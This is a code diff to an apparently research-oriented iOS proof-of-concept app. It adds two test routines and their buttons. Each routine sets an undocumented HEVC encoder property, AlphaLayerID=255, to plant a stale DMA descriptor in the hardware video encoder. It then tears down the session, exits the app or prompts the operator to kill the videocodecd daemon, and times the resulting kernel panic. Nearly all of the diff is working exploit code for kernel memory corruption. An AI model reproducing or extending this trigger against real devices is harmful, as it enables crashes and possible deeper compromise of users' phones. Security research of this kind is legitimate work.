@@ -2888,6 +2888,289 @@ static void runRunB_v2(void) {
 }
 
 // ============================================================
+// Run C: Daemon-kill fire-control test
+// Arms with Alpha=255, then immediately tears down ALL sessions
+// and exits the app to force videocodecd termination.
+// Tests whether explicit daemon death produces fast deterministic panic.
+// ============================================================
+
+static void runRunC(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  RUN C: Daemon-Kill Fire-Control Test     ║");
+    pocLog(@"║  Alpha=255 arm → teardown → app exit      ║");
+    pocLog(@"║  Tests: panic timing vs daemon death       ║");
+    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***           ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
+    fmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // Step 1: Canary
+    LOG(@"--- STEP 1: CANARY (AlphaLayerID=0) ---");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK — encoder healthy.");
+    idleWait(5, @"canary cooldown");
+
+    // Step 2: Arm with Alpha=255
+    LOG(@"--- STEP 2: ARM with AlphaLayerID=255 ---");
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        g_phase2Running = NO;
+        return;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer failed");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    g_narrowGotOutput = NO;
+    g_oracleContext = @"runC-arm";
+
+    LOG(@"*** ENCODING WITH AlphaLayerID=255 (arming stale DMA descriptor) ***");
+    NSString *armTime = [fmt stringFromDate:[NSDate date]];
+    LOG(@"ARM time: %@", armTime);
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d (%s)", (int)status,
+        status == noErr ? "submitted" : "error");
+
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+
+    BOOL armed = !g_narrowGotOutput;
+    INFO(@"Callback output: %@ (expect NO for -17691 path)",
+        g_narrowGotOutput ? @"YES" : @"NO");
+    CVPixelBufferRelease(pb);
+
+    if (!armed) {
+        INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
+    } else {
+        PASS(@"Armed: -17691 error path taken. Stale DMA descriptor planted.");
+    }
+    pocLog(@"");
+
+    // Step 3: Immediate full teardown
+    LOG(@"--- STEP 3: IMMEDIATE SESSION TEARDOWN ---");
+    LOG(@"Teardown start: %@", [fmt stringFromDate:[NSDate date]]);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    session = NULL;
+    LOG(@"Session invalidated + released: %@", [fmt stringFromDate:[NSDate date]]);
+    pocLog(@"");
+
+    // Step 4: Choose exit strategy
+    // Strategy A: Exit app to drop all XPC connections to videocodecd
+    // Strategy B: Stay alive and wait, let system decide when to kill daemon
+    // We do BOTH: wait 10s first (strategy B), then exit (strategy A)
+
+    LOG(@"--- STEP 4: FIRE CONTROL ---");
+    INFO(@"Waiting 10s for natural daemon teardown...");
+    INFO(@"If phone panics during this wait = strategy B works.");
+    pocLog(@"");
+
+    for (int s = 10; s > 0; s--) {
+        LOG(@"  T+%ds: %@ — still alive", 10 - s + 1, [fmt stringFromDate:[NSDate date]]);
+        [NSThread sleepForTimeInterval:1.0];
+    }
+    pocLog(@"");
+
+    // If we're still here, natural teardown didn't fire fast enough.
+    // Try strategy A: exit the app to force videocodecd client disconnect.
+    LOG(@"=== NO PANIC IN 10s — FORCING APP EXIT ===");
+    LOG(@"Exit time: %@", [fmt stringFromDate:[NSDate date]]);
+    INFO(@"App exiting to drop videocodecd XPC connection.");
+    INFO(@"videocodecd should be terminated by launchd shortly.");
+    INFO(@"Record wall-clock: if panic fires within seconds of");
+    INFO(@"this timestamp, fire-control is CONFIRMED.");
+    pocLog(@"");
+    LOG(@"ARM time was: %@", armTime);
+    LOG(@"EXIT time is: %@", [fmt stringFromDate:[NSDate date]]);
+    pocLog(@"");
+
+    // Flush logs before exit
+    [NSThread sleepForTimeInterval:0.5];
+    NSLog(@"[RUN-C] ARM=%@ EXIT=%@ — EXITING NOW",
+        armTime, [fmt stringFromDate:[NSDate date]]);
+
+    // Force exit to drop all XPC connections
+    exit(0);
+}
+
+// ============================================================
+// Run C-alt: Stay-alive variant with continuous timing
+// Same as Run C but doesn't exit — watches for panic while logging timestamps.
+// Use when you want to capture the exact timing without losing the log.
+// Manual kill: from Mac, run `idevicedebug kill <bundleid>` or
+// the deploy script's kill helper.
+// ============================================================
+
+static void runRunC_alt(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  RUN C-alt: Stay-Alive Timing Capture    ║");
+    pocLog(@"║  Alpha=255 arm → teardown → watch 5min   ║");
+    pocLog(@"║  Kill videocodecd from Mac when prompted  ║");
+    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***          ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
+    fmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // Step 1: Canary
+    LOG(@"--- STEP 1: CANARY ---");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK.");
+    idleWait(5, @"canary cooldown");
+
+    // Step 2: Arm
+    LOG(@"--- STEP 2: ARM ---");
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        g_phase2Running = NO;
+        return;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer failed");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    g_narrowGotOutput = NO;
+    g_oracleContext = @"runC-alt-arm";
+
+    NSString *armTime = [fmt stringFromDate:[NSDate date]];
+    LOG(@"ARM time: %@", armTime);
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+
+    BOOL armed = !g_narrowGotOutput;
+    INFO(@"Armed: %@ (-17691 = YES)", armed ? @"YES" : @"NO");
+    CVPixelBufferRelease(pb);
+
+    // Step 3: Teardown
+    LOG(@"--- STEP 3: TEARDOWN ---");
+    NSString *teardownTime = [fmt stringFromDate:[NSDate date]];
+    LOG(@"Teardown: %@", teardownTime);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    session = NULL;
+    LOG(@"Session destroyed: %@", [fmt stringFromDate:[NSDate date]]);
+    pocLog(@"");
+
+    // Step 4: Stay alive, log continuously
+    LOG(@"╔══════════════════════════════════════════╗");
+    LOG(@"║  KILL videocodecd FROM MAC NOW!           ║");
+    LOG(@"║  Run: killall videocodecd                 ║");
+    LOG(@"║  Or: idevicedebug kill [bundleid]         ║");
+    LOG(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    LOG(@"Continuous timing — last line before panic is the fire delay:");
+    LOG(@"ARM: %@  TEARDOWN: %@", armTime, teardownTime);
+    pocLog(@"");
+
+    // Log every second for 5 minutes. Last line printed = delay before panic.
+    for (int s = 1; s <= 300; s++) {
+        [NSThread sleepForTimeInterval:1.0];
+        if (s <= 30 || s % 10 == 0) {
+            LOG(@"T+%03ds: %@ — alive (arm was %@)",
+                s, [fmt stringFromDate:[NSDate date]], armTime);
+        }
+    }
+
+    pocLog(@"");
+    PASS(@"=== RUN C-alt: NO PANIC IN 5 MIN ===");
+    INFO(@"ARM: %@  TEARDOWN: %@", armTime, teardownTime);
+    INFO(@"videocodecd may not have been killed, or model is wrong.");
+    g_phase2Running = NO;
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -3396,7 +3679,35 @@ static void runTier2Probe(void) {
     [runBv2Btn addTarget:self action:@selector(runRunBv2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:runBv2Btn];
 
-    CGFloat logTop = row7 + btnH + gap;
+    // Run C buttons — row 8: daemon-kill fire-control test
+    CGFloat row8 = row7 + btnH + gap;
+    CGFloat runCBtnW = (w - pad * 2 - gap) / 2;
+
+    UIButton *runCBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    runCBtn.frame = CGRectMake(pad, row8, runCBtnW, btnH);
+    runCBtn.backgroundColor = [UIColor colorWithRed:0.5 green:0.0 blue:0.3 alpha:1];
+    runCBtn.layer.cornerRadius = 8;
+    runCBtn.layer.borderWidth = 2;
+    runCBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1].CGColor;
+    runCBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
+    [runCBtn setTitle:@"Run C: Kill+Exit" forState:UIControlStateNormal];
+    [runCBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1] forState:UIControlStateNormal];
+    [runCBtn addTarget:self action:@selector(runRunC) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:runCBtn];
+
+    UIButton *runCAltBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    runCAltBtn.frame = CGRectMake(pad + runCBtnW + gap, row8, runCBtnW, btnH);
+    runCAltBtn.backgroundColor = [UIColor colorWithRed:0.5 green:0.0 blue:0.3 alpha:1];
+    runCAltBtn.layer.cornerRadius = 8;
+    runCAltBtn.layer.borderWidth = 2;
+    runCAltBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1].CGColor;
+    runCAltBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
+    [runCAltBtn setTitle:@"Run C-alt: Watch" forState:UIControlStateNormal];
+    [runCAltBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1] forState:UIControlStateNormal];
+    [runCAltBtn addTarget:self action:@selector(runRunCAlt) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:runCAltBtn];
+
+    CGFloat logTop = row8 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -3508,6 +3819,18 @@ static void runTier2Probe(void) {
 - (void)runRunBv2 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runRunB_v2();
+    });
+}
+
+- (void)runRunC {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runRunC();
+    });
+}
+
+- (void)runRunCAlt {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runRunC_alt();
     });
 }
 
